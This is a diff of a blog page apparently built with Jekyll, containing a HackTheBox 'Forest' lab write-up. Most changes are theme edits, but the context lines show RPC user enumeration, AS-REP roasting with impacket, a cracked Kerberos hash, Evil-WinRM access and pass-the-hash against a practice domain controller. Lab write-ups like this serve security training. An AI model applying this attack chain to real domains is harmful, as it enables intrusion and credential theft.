@@ -13,9 +13,9 @@
 <meta name="description" content="It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell.">
 
 
-  <meta name="author" content="Your Name">
+  <meta name="author" content="DcodeZer0">
   
-  <meta property="article:author" content="Your Name">
+  <meta property="article:author" content="DcodeZer0">
   
 
 
@@ -23,16 +23,28 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="Dcodezero">
 <meta property="og:title" content="HackTheBox Forest">
-<meta property="og:url" content="https://dcodezero.github.io//hackthebox/Forest/">
+<meta property="og:url" content="http://0.0.0.0:4000/hackthebox/Forest/">
 
 
   <meta property="og:description" content="It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell.">
 
 
 
-  <meta property="og:image" content="https://dcodezero.github.io//assets/img/sample/forest.png">
+  <meta property="og:image" content="http://0.0.0.0:4000/assets/img/sample/forest.png">
 
 
+
+  <meta name="twitter:site" content="@Dcodezer0">
+  <meta name="twitter:title" content="HackTheBox Forest">
+  <meta name="twitter:description" content="It is a domain controller that allows me to enumerate users over RPC, attack Kerberos with AS-REP Roasting, and use Win-RM to get a shell.">
+  <meta name="twitter:url" content="http://0.0.0.0:4000/hackthebox/Forest/">
+
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="http://0.0.0.0:4000/assets/img/sample/forest.png">
+  
+
+  
 
 
 
@@ -47,7 +59,7 @@
   
 
 
-<link rel="canonical" href="https://dcodezero.github.io//hackthebox/Forest/">
+<link rel="canonical" href="http://0.0.0.0:4000/hackthebox/Forest/">
 
 
 
@@ -93,7 +105,7 @@ document.addEventListener("DOMContentLoaded", function() {
 </script><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <script>
 document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
- 
+ window.enable_copy_code_button = true;
 </script>
 <!-- For all browsers -->
 <link rel="stylesheet" href="/assets/css/main.css">
@@ -124,6 +136,8 @@ document.documentElement.className = document.documentElement.className.replace(
   <div class="masthead__inner-wrap">
     <div class="masthead__menu">
       <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/brew.webp" alt="Dcodezero"></a>
         
         <a class="site-title" href="/">
           Dcodezero
@@ -160,6 +174,11 @@ document.documentElement.className = document.documentElement.className.replace(
                 
               >Tools</a>
             </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
         
         <button class="greedy-nav__toggle hidden" type="button">
           <span class="visually-hidden">Toggle menu</span>
@@ -201,8 +220,15 @@ document.documentElement.className = document.documentElement.className.replace(
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2020-04-20T00:00:00+00:00">April 20, 2020</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
@@ -211,7 +237,7 @@ document.documentElement.className = document.documentElement.className.replace(
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          4 minute read
+          6 minute read
         
       </span>
     
@@ -229,6 +255,43 @@ document.documentElement.className = document.documentElement.className.replace(
 
 
 
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>
+
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#hackthebox" itemprop="item"><span itemprop="name">Hackthebox</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">HackTheBox Forest</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
 
 <div id="main" role="main">
   
@@ -239,14 +302,21 @@ document.documentElement.className = document.documentElement.className.replace(
 <div itemscope itemtype="https://schema.org/Person" class="h-card">
 
   
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/brew.webp" alt="DcodeZer0" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
 
   <div class="author__content">
     <h3 class="author__name p-name" itemprop="name">
-      <a class="u-url" rel="me" href="/" itemprop="url">Your Name</a>
+      <a class="u-url" rel="me" href="/" itemprop="url">DcodeZer0</a>
     </h3>
     
       <div class="author__bio p-note" itemprop="description">
-        <p>I am an <strong>amazing</strong> person.</p>
+        <p>┌──[root@dcodezero]
+└──╼ # Hacker | RedTeam | PenTester | CTFPlayer | HackTheBox</p>
 
       </div>
     
@@ -264,21 +334,28 @@ document.documentElement.className = document.documentElement.className.replace(
       
         
           
-        
+            <li><a href="https://twitter.com/Dcodezer0" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
           
         
           
-        
+            <li><a href="https://github.com/DcodeZero" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
           
         
           
-        
+            <li><a href="https://app.hackthebox.com/profile/291968" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fa-solid fa-cube" aria-hidden="true"></i><span class="label">Hackthebox</span></a></li>
           
         
       
 
       
 
+      
+        <li>
+          <a href="mailto:dcodezero@proton.me" rel="me" class="u-email">
+            <meta itemprop="email" content="dcodezero@proton.me" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
       
 
       
@@ -467,7 +544,7 @@ Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
 
 <h2 id="finding-users-in-the-domain">Finding Users in the domain</h2>
 
-<p>I used <code>RPCCLIENT</code> to find the users in the domain</p>
+<p>I used <code class="language-plaintext highlighter-rouge">RPCCLIENT</code> to find the users in the domain</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#rpcclient 10.10.10.161 -U%
 rpcclient $&gt; enumdom
@@ -507,13 +584,13 @@ user:[santi] rid:[0x480]
 </code></pre></div></div>
 
 <h2 id="getting-tgt">Getting TGT</h2>
-<p>Getting the <code>TGT</code> from the list of users found from <code>RPCCLIENT</code> using <code>IMPACKET SCRIPTS</code>.</p>
+<p>Getting the <code class="language-plaintext highlighter-rouge">TGT</code> from the list of users found from <code class="language-plaintext highlighter-rouge">RPCCLIENT</code> using <code class="language-plaintext highlighter-rouge">IMPACKET SCRIPTS</code>.</p>
 
 <blockquote>
   <p>python GetNPUsers.py -no-pass -k -dc-ip 10.10.10.161 htb.local/svc-alfresco</p>
 </blockquote>
 
-<p>There are a bunch of ways to use <code>impacket-scripts</code>, so we can use the below options as well.</p>
+<p>There are a bunch of ways to use <code class="language-plaintext highlighter-rouge">impacket-scripts</code>, so we can use the below options as well.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Options:
 
@@ -524,7 +601,7 @@ htb.local - is the domain name we extracted from the nmap output
 -dc-ip - the domain controller IP address
 </code></pre></div></div>
 
-<p>we get the hash of the user <code>SVC-alfresco</code></p>
+<p>we get the hash of the user <code class="language-plaintext highlighter-rouge">SVC-alfresco</code></p>
 
 <blockquote>
   <p>$krb5asrep$23$svc-alfresco@HTB.LOCAL:14c0bc63892470b5a2246ad5456d61f8$11340938cc2f5070bce088816b5a70abb614dcceeaafb99e59788bb288b0b3ad0231b46ec4603d9ebac192028e8d7ac1042cedc80d38c048ba2e8a881f26c0d94d267a52cc59194f4c7b08bef5256198f73e3e9a60c3aa6f92623c12e0b7c4a425edbfbe72561eb97142c8853dea7f532589e7e03d61bbccddaff66bad8d4e1039384ceb364c9d95c1a6828fc9eb232a176f44c44844eed8d9eecf208e22617a46ee61881f9bfda2ab3b67428a43d76798299cda3de9b279b88e8d34e40ab62846252050d6c48870527f1208bf1fb67f17452b0813358c8cefb0df724ce323ba39e212065cbb</p>
@@ -539,10 +616,10 @@ htb.local - is the domain name we extracted from the nmap output
 </blockquote>
 
 <blockquote>
-  <p>$krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:<code>s3rvice</code></p>
+  <p>$krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:<code class="language-plaintext highlighter-rouge">s3rvice</code></p>
 </blockquote>
 
-<p>As the password is found, I proceed with using <code>Evil-Winrm</code> to gain the foothold of the machine</p>
+<p>As the password is found, I proceed with using <code class="language-plaintext highlighter-rouge">Evil-Winrm</code> to gain the foothold of the machine</p>
 
 <h2 id="getting-usertxt">Getting User.txt</h2>
 
@@ -559,11 +636,11 @@ Info: Establishing connection to remote endpoint
 
 <h3 id="from-svc-alfresco-to-administrator">From svc-alfresco to Administrator</h3>
 
-<p>Using <code>bloodhound</code> to find some intresting stuff</p>
+<p>Using <code class="language-plaintext highlighter-rouge">bloodhound</code> to find some intresting stuff</p>
 
 <p><img src="/assets/img/sample/forest1.png" alt="" /></p>
 
-<p>BloodHound Result Shows Svc-Alfresco can <code>WriteDacl</code> to HTB.local that Contains <code>administrator@htb.local.</code></p>
+<p>BloodHound Result Shows Svc-Alfresco can <code class="language-plaintext highlighter-rouge">WriteDacl</code> to HTB.local that Contains <code class="language-plaintext highlighter-rouge">administrator@htb.local.</code></p>
 
 <h3 id="useful-link-for-priv-esc">Useful link for priv esc</h3>
 
@@ -593,7 +670,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 </code></pre></div></div>
 
-<p>So as we found the hash of the Administrator of the domain, we can now use <code>Pass the hash</code> to gain the Shell of Administrator.</p>
+<p>So as we found the hash of the Administrator of the domain, we can now use <code class="language-plaintext highlighter-rouge">Pass the hash</code> to gain the Shell of Administrator.</p>
 
 <h2 id="getting-roottxt">Getting Root.txt</h2>
 
@@ -670,11 +747,11 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
       <section class="page__share">
   <h4 class="page__share-title">Share on</h4>
 
-  <a href="https://twitter.com/intent/tweet?text=HackTheBox+Forest%20%2Fhackthebox%2FForest%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?via=Dcodezer0&text=HackTheBox+Forest%20%2Fhackthebox%2FForest%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdcodezero.github.io%2F%2Fhackthebox%2FForest%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fhackthebox%2FForest%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://dcodezero.github.io//hackthebox/Forest/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://0.0.0.0:4000/hackthebox/Forest/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
@@ -724,17 +801,24 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-06T00:00:00+00:00">January 6, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          18 minute read
+          24 minute read
         
       </span>
     
@@ -769,17 +853,24 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-06T00:00:00+00:00">January 6, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          6 minute read
+          9 minute read
         
       </span>
     
@@ -814,17 +905,24 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-05T00:00:00+00:00">January 5, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          6 minute read
+          9 minute read
         
       </span>
     
@@ -859,17 +957,24 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-04T00:00:00+00:00">January 4, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          8 minute read
+          11 minute read
         
       </span>
     
@@ -892,6 +997,17 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
       
     </div>
 
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
     
  
   
@@ -977,7 +1093,7 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 </div>
 
 
-<div class="page__footer-copyright">&copy; 2026 <a href="https://dcodezero.github.io/">Dcodezero</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div> 
+<div class="page__footer-copyright">&copy; 2026 <a href="https://dcodezero.github.io/">dcodezero</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div> 
 
       </footer>
     </div>
@@ -988,7 +1104,30 @@ My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291
 
 
 
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
 
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/hackthebox/Forest/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/hackthebox/Forest"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://dcode_zero.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
 
 
 
